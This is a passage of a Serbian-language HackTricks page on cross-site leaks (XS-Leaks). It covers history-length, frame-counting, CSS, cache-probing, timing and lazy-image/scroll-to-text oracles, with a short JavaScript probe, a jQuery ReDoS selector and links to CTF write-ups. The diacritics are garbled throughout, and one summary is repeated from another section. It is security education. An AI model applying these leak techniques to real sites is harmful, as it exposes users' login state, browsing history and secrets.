* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Rezime:** JavaScript kod manipuli코e istorijom pregleda캜a i mo쬰 se pristupiti preko svojstva du쬴ne.
* **Primer Koda**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

API Istorije dozvoljava JavaScript kodu da manipuli코e istorijom pregleda캜a, koja **캜uva stranice koje je posetio korisnik**. Napada캜 mo쬰 koristiti svojstvo du쬴ne kao metodu uklju캜ivanja: da detektuje JavaScript i HTML navigaciju.\
Provera `history.length`, nateranje korisnika da **navigira** do stranice, **vrati** je na isti izvor i **provera** nove vrednosti **`history.length`**.

### Du쬴na Istorije sa istim URL-om

* **Metode Uklju캜ivanja**: Frejmovi, Iska캜u캖i Prozori
* **Detektovana Razlika**: Ako je URL isti kao pretpostavljeni
* **Rezime:** Mogu캖e je pretpostaviti da li je lokacija frejma/iska캜u캖eg prozora na odre캠enom URL-u zloupotrebom du쬴ne istorije.
* **Primer Koda**: Ispod

Napada캜 bi mogao koristiti JavaScript kod da **manipuli코e lokacijom frejma/iska캜u캖eg prozora na pretpostavljenom URL-u** i **odmah** je **promeniti u `about:blank`**. Ako se du쬴na istorije pove캖ala, to zna캜i da je URL bio ta캜an i da je imao vremena da se **pove캖a jer URL nije ponovo u캜itan ako je isti**. Ako se nije pove캖ala, to zna캜i da je **poku코ao da u캜ita pretpostavljeni URL** ali jer smo **odmah nakon toga** u캜itali **`about:blank`**, **du쬴na istorije nikada nije porasla** prilikom u캜itavanja pretpostavljenog URL-a.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Brojanje okvira

* **Metode uklju캜ivanja**: Okviri, Iska캜u캖i prozori
* **Detektoviva razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Sa쬰tak:** Procenite koli캜inu elemenata iframe inspekcijom svojstva `window.length`.
* **Primer koda**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Brojanje **broja okvira na vebu** otvorenih putem `iframe` ili `window.open` mo쬰 pomo캖i u identifikaciji **statusa korisnika na toj stranici**.\
Osim toga, ako stranica uvek ima isti broj okvira, proveravanje **kontinuirano** broja okvira mo쬰 pomo캖i u identifikaciji **uzorka** koji mo쬰 otkriti informacije.

Primer ove tehnike je da se u Chrome-u **PDF** mo쬰 **detektovati** pomo캖u **brojanja okvira** jer se interna upotrebljava `embed`. Postoje [Parametri otvorenog URL-a](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omogu캖avaju odre캠enu kontrolu nad sadr쬬jem poput `zoom`, `view`, `page`, `toolbar` gde bi ova tehnika mogla biti interesantna.

### HTMLElementi

* **Metode uklju캜ivanja**: HTML elementi
* **Detektoviva razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Sa쬰tak:** Pro캜itajte procurjelu vrednost da biste razlikovali izme캠u 2 mogu캖a stanja
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Procurjivanje informacija putem HTML elemenata predstavlja zabrinutost u vezi sa bezbedno코캖u veba, posebno kada se dinami캜ki medijski fajlovi generi코u na osnovu korisni캜kih informacija, ili kada se dodaju vodeni 쬴govi, menjaju캖i veli캜inu medija. To mogu iskoristiti napada캜i kako bi razlikovali mogu캖a stanja analiziraju캖i informacije izlo쬰ne odre캠enim HTML elementima.

### Informacije izlo쬰ne HTML elementima

* **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, koje se mogu pristupiti putem njegovog API-ja. [Pro캜itajte vi코e o HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Otkriva `videoHeight` i `videoWidth`. U nekim pregleda캜ima, dodatna svojstva poput `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` i `webkitDecodedFrameCount` su dostupna, pru쬬ju캖i detaljnije informacije o sadr쬬ju medija. [Pro캜itajte vi코e o HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Ova funkcija pru쬬 detalje o kvalitetu reprodukcije videa, uklju캜uju캖i `totalVideoFrames`, 코to mo쬰 ukazivati na koli캜inu obra캠enih video podataka. [Pro캜itajte vi코e o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Ovaj element otkriva `height` i `width` slike. Me캠utim, ako je slika neva쬰캖a, ova svojstva 캖e vratiti 0, a funkcija `image.decode()` 캖e biti odbijena, ukazuju캖i na neuspeh u캜itavanja slike na odgovaraju캖i na캜in. [Pro캜itajte vi코e o HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS svojstvo

* **Metode uklju캜ivanja**: HTML elementi
* **Detektoviva razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Sa쬰tak:** Identifikujte varijacije u stilizovanju veb sajta koje se koreliraju sa korisnikovim stanjem ili statusom.
* **Primer koda**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Veb aplikacije mogu promeniti **stilizovanje veb sajta u zavisnosti od statusa korisnika**. CSS fajlovi sa razli캜itih izvora mogu biti ugra캠eni na stranicu napada캜a pomo캖u **HTML link elementa**, i **pravila** 캖e biti **primenjena** na stranicu napada캜a. Ako stranica dinami캜ki menja ova pravila, napada캜 mo쬰 **detektovati** ove **razlike** u zavisnosti od korisni캜kog stanja.\
Kao tehniku curenja, napada캜 mo쬰 koristiti metodu `window.getComputedStyle` da **pro캜ita CSS** svojstva odre캠enog HTML elementa. Kao rezultat, napada캜 mo쬰 pro캜itati proizvoljna CSS svojstva ako su poznati pogo캠eni element i naziv svojstva.

### CSS istorija

* **Metode uklju캜ivanja**: HTML elementi
* **Detektoviva razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Sa쬰tak:** Detektujte da li je primenjen stil `:visited` na URL, 코to ukazuje da je ve캖 pose캖en
* **Primer koda**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Prema [**ovome**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), ovo ne funkcioni코e u headless Chrome-u.
{% endhint %}

CSS `:visited` selektor se koristi za stilizovanje URL-ova na druga캜iji na캜in ako su ih korisnici prethodno posetili. Ranije je metoda `getComputedStyle()` mogla da se koristi za identifikaciju ovih stilskih razlika. Me캠utim, moderni pregleda캜i su implementirali sigurnosne mere kako bi spre캜ili da ova metoda otkrije stanje linka. Ove mere uklju캜uju uvek vra캖anje izra캜unatog stila kao da je link pose캖en i ograni캜avanje stilova koji se mogu primeniti sa selektorom `:visited`.

I pored ovih ograni캜enja, mogu캖e je neizravno uo캜iti pose캖eno stanje linka. Jedna tehnika uklju캜uje prevaru korisnika da interaguju sa podru캜jem koje je pogo캠eno CSS-om, posebno kori코캖enjem svojstva `mix-blend-mode`. Ovo svojstvo omogu캖ava me코anje elemenata sa njihovom pozadinom, potencijalno otkrivaju캖i pose캖eno stanje na osnovu korisni캜ke interakcije.

Osim toga, detekcija mo쬰 biti postignuta bez interakcije korisnika iskori코캖avanjem vremena renderovanja linkova. Po코to pregleda캜i mogu renderovati pose캖ene i nepose캖ene linkove na razli캜ite na캜ine, to mo쬰 uvesti merljivu razliku u vremenu renderovanja. Dokaz o konceptu (PoC) je pomenut u izve코taju o bagu u Chromium-u, demonstriraju캖i ovu tehniku kori코캖enjem vi코e linkova kako bi se poja캜ala razlika u vremenu, 캜ime se 캜ini da je pose캖eno stanje detektovano analizom vremena.

Za dodatne detalje o ovim svojstvima i metodama, posetite njihove stranice sa dokumentacijom:

* `:visited`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### ContentDocument X-Frame Leak

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Zaglavlja
* **Vi코e informacija**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Sa쬰tak:** U Google Chrome-u, posve캖ena gre코ka se prikazuje kada je stranica blokirana za ugradnju na sajt preko granica izvora zbog restrikcija X-Frame-Options.
* **Primer koda**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa zaglavljem `X-Frame-Options` postavljena na "deny" ili "same-origin" ugra캠ena kao objekat, pojavljuje se stranica gre코ke. Chrome jedinstveno vra캖a prazan dokument objekat (umesto `null`) za svojstvo `contentDocument` ovog objekta, za razliku od iframes ili drugih pregleda캜a. Napada캜i bi mogli iskoristiti ovo otkrivanjem praznog dokumenta, potencijalno otkrivaju캖i informacije o stanju korisnika, posebno ako programeri nekonzistentno postavljaju zaglavlje X-Frame-Options, 캜esto previdjaju캖i stranice gre코ke. Svest i dosledna primena sigurnosnih zaglavlja su klju캜ne za spre캜avanje takvih curenja.

### Detekcija Preuzimanja

* **Metode uklju캜ivanja**: Okviri, Iska캜u캖i prozori
* **Detektibilna razlika**: Zaglavlja
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Sa쬰tak:** Napada캜 mo쬰 razlikovati preuzimanje datoteka iskori코캖avanjem iframes; nastavljena dostupnost iframa implicira uspe코no preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Zaglavlje `Content-Disposition`, posebno `Content-Disposition: attachment`, instrui코e pregleda캜 da preuzme sadr쬬j umesto da ga prika쬰 u liniji. Ovo pona코anje mo쬰 biti iskori코캖eno za otkrivanje da li korisnik ima pristup stranici koja pokre캖e preuzimanje datoteke. U pregleda캜ima zasnovanim na Chromium-u, postoje nekoliko tehnika za otkrivanje ovog pona코anja preuzimanja:

1. **Pratnja Trake Preuzimanja**:
* Kada se datoteka preuzme u pregleda캜ima zasnovanim na Chromium-u, traka preuzimanja se pojavljuje na dnu prozora pregleda캜a.
* Prate캖i promene u visini prozora, napada캜i mogu zaklju캜iti pojavu trake preuzimanja, sugeri코u캖i da je preuzimanje pokrenuto.
2. **Navigacija Preuzimanja sa Iframes**:
* Kada stranica pokrene preuzimanje datoteke koriste캖i zaglavlje `Content-Disposition: attachment`, to ne izaziva doga캠aj navigacije.
* U캜itavanjem sadr쬬ja u iframe i pra캖enjem doga캠aja navigacije, mogu캖e je proveriti da li uzrokovanje rasporeda sadr쬬ja pokre캖e preuzimanje datoteke (bez navigacije) ili ne.
3. **Navigacija Preuzimanja bez Iframes**:
* Sli캜no kao tehnika sa iframe-om, ovaj metod uklju캜uje kori코캖enje `window.open` umesto iframe-a.
* Pra캖enjem doga캠aja navigacije u novootvorenom prozoru mo쬰 se otkriti da li je pokrenuto preuzimanje datoteke (bez navigacije) ili se sadr쬬j prikazuje u liniji (nastupa navigacija).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti za indirektno zaklju캜ivanje autentifikacionog stanja korisnika na osnovu odgovora pregleda캜a na zahtev za preuzimanje.

### Bajpasiranje Particionisanog HTTP Ke코a <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metode uklju캜ivanja**: Iska캜u캖i prozori
* **Detektibilna razlika**: Vreme
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Sa쬰tak:** Napada캜 mo쬰 razlikovati preuzimanje datoteka iskori코캖avanjem iframes; nastavljena dostupnost iframa implicira uspe코no preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (sa [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Za코to je ova tehnika interesantna: Chrome sada ima **particionisanje ke코a**, i ke코 klju캜 novootvorene stranice je: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ali ako otvorim ngrok stranicu i koristim fetch u njoj, ke코 klju캜 캖e biti: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **ke코 klju캜 je razli캜it**, tako da ke코 ne mo쬰 biti deljen. Vi코e detalja mo쬰te prona캖i ovde: [Pobolj코anje sigurnosti i privatnosti particionisanjem ke코a](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Komentar sa [**ovde**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Ako sajt `primer.com` uklju캜uje resurs sa `*.primer.com/resource` onda 캖e taj resurs imati **isti ke코 klju캜** kao da je resurs direktno **zahtevan kroz navigaciju na vrh nivoa**. To je zato 코to je ke코 klju캜 sastavljen od vrh nivoa _eTLD+1_ i okvira _eTLD+1_.

Zbog toga 코to je pristup ke코u br쬴 od u캜itavanja resursa, mogu캖e je poku코ati promeniti lokaciju stranice i otkazati je 20ms (na primer) nakon toga. Ako je poreklo promenjeno nakon zaustavljanja, to zna캜i da je resurs ke코iran.\
Ili se mo쬰 **poslati fetch za potencijalno ke코iranu stranicu i meriti vreme koje je potrebno**.

### Ru캜no Preusmeravanje <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Preusmeravanja
* **Vi코e informacija**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Sa쬰tak:** Mogu캖e je saznati da li je odgovor na fetch zahtev preusmeren
* **Primer koda**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch sa AbortController-om <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Vreme
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Sa쬰tak:** Mogu캖e je poku코ati u캜itati resurs i prekinuti u캜itavanje pre nego 코to se zavr코i. Zavisno o tome da li je izazvana gre코ka, resurs je ili nije ke코iran.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Koristite _**fetch**_ i _**setTimeout**_ sa **AbortController**-om kako biste detektovali da li je **resurs ke코iran** i kako biste uklonili odre캠eni resurs iz ke코a pregleda캜a. Osim toga, proces se odvija bez ke코iranja novog sadr쬬ja.
### Skriptna zaga캠enost

* **Metode uklju캜ivanja**: HTML elementi (skripta)
* **Detektibilna razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Sa쬰tak:** Mogu캖e je **prepisati ugra캠ene funkcije** i pro캜itati njihove argumente 캜ak i iz **skripte sa razli캜itog porekla** (koja se ne mo쬰 direktno pro캜itati), 코to mo쬰 **procureti vredne informacije**.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Servisni radnici <a href="#service-workers" id="service-workers"></a>

* **Metode uklju캜ivanja**: Iska캜u캖i prozori
* **Detektibilna razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Sa쬰tak:** Merenje vremena izvr코avanja veba kori코캖enjem servisnih radnika.
* **Primer koda**:

U datom scenariju, napada캜 preduzima inicijativu da registruje **servisnog radnika** unutar jednog od svojih domena, ta캜nije "attacker.com". Zatim, napada캜 otvara novi prozor na ciljnom veb sajtu iz glavnog dokumenta i nare캠uje **servisnom radniku** da pokrene tajmer. Kako novi prozor po캜inje da se u캜itava, napada캜 navigira referencu dobijenu u prethodnom koraku ka stranici koju upravlja **servisni radnik**.

Po dolasku zahteva pokrenutog u prethodnom koraku, **servisni radnik** odgovara sa statusnim kodom **204 (Nema sadr쬬ja)**, efikasno zavr코avaju캖i proces navigacije. U tom trenutku, **servisni radnik** bele쬴 merenje sa tajmera pokrenutog ranije u drugom koraku. Ovo merenje je uticano trajanjem JavaScript-a koji uzrokuje ka코njenja u procesu navigacije.

{% hint style="warning" %}
U merenju izvr코avanja je mogu캖e **eliminisati** **mre쬹e faktore** kako bi se dobile **preciznije merenja**. Na primer, u캜itavanjem resursa kori코캖enih od strane stranice pre njenog u캜itavanja.
{% endhint %}

### Vreme dohvata

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Vreme (uglavnom zbog Sadr쬬ja stranice, Statusnog koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Sa쬰tak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvr코avanje zahteva. Mogu se koristiti i drugi 캜asovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Vreme preko prozora

* **Metode uklju캜ivanja**: Iska캜u캖i prozori
* **Detektibilna razlika**: Vreme (uglavnom zbog Sadr쬬ja stranice, Statusnog koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Sa쬰tak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvr코avanje zahteva kori코캖enjem `window.open`. Mogu se koristiti i drugi 캜asovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sa HTML-om ili Re Injekcijom

Ovde mo쬰te prona캖i tehnike za eksfiltraciju informacija sa prekograni캜nog HTML-a **ubacivanjem HTML sadr쬬ja**. Ove tehnike su interesantne u slu캜ajevima kada iz bilo kog razloga mo쬰te **ubaciti HTML ali ne mo쬰te ubaciti JS kod**.

### Vise캖i Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### U캜itavanje slika na zahtev

Ako trebate **eksfiltrirati sadr쬬j** i mo쬰te **dodati HTML pre tajnog sadr쬬ja** trebali biste proveriti **uobi캜ajene tehnike vise캖eg markupa**.\
Me캠utim, ako iz bilo kog razloga **MORATE** to uraditi **po karakter po karakter** (mo쬯a je komunikacija putem pogotka ke코a) mo쬰te koristiti ovu prevaru.

**Slike** u HTML-u imaju atribut "**loading**" 캜ija vrednost mo쬰 biti "**lenjo**". U tom slu캜aju, slika 캖e se u캜itati kada bude prikazana, a ne dok se stranica u캜itava:
```html
<img src=/something loading=lazy >
```
Dakle, ono 코to mo쬰te uraditi je da **dodate puno beskorisnih znakova** (Na primer **hiljade "W" znakova**) da **popunite web stranicu pre tajnog sadr쬬ja ili dodate ne코to poput** `<br><canvas height="1850px"></canvas><br>.`\
Zatim, ako na primer na코 **injekcija se pojavi pre zastave**, **slika** 캖e biti **u캜itana**, ali ako se pojavi **nakon** **zastave**, zastava + beskorisni znakovi 캖e **spre캜iti u캜itavanje** (morate igrati se sa koli캜inom beskorisnih znakova koje treba postaviti). To se desilo u [**ovom writeup-u**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bila bi kori코캖enje **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

Me캠utim, mo쬰te **omogu캖iti botu pristup stranici** sa ne캜im poput
```
#:~:text=SECR
```
Tako 캖e web stranica izgledati ne코to poput: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadr쬴 napada캜ke sme코ne karaktere i slike koje se u캜itavaju lenjo, a zatim se dodaje tajna informacija o botu.

Ova tekst 캖e naterati bota da pristupi bilo kom tekstu na stranici koji sadr쬴 tekst `SECR`. Po코to je taj tekst tajna informacija i nalazi se **ispod slike**, slika 캖e se **u캜itati samo ako je pretpostavljena tajna ta캜na**. Tako da imate svoj orakul za **eksfiltraciju tajne karakter po karakter**.

Primer koda za iskori코캖avanje ovoga: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Vreme U캜itavanja Slike sa Lenjim U캜itavanjem

Ako nije **mogu캖e u캜itati spoljnu sliku** 코to bi moglo ukazati napada캜u da je slika u캜itana, druga opcija bi bila **poku코ati pogoditi karakter nekoliko puta i meriti to**. Ako je slika u캜itana, svi zahtevi 캖e trajati du쬰 nego ako slika nije u캜itana. To je ono 코to je kori코캖eno u [**re코enju ovog teksta**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumirano ovde:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Ako se koristi `jQuery(location.hash)`, mogu캖e je otkriti putem vremena da li **neki HTML sadr쬬j postoji**, to je zato 코to ako se selektor `main[id='site-main']` ne podudara, nije potrebno proveravati ostale **selektore**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Odbrane

Preporu캜ene su mere za코tite u [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tako캠e u svakom delu wiki [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo vi코e informacija o tome kako se za코tititi od ovih tehnika.

## Reference

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
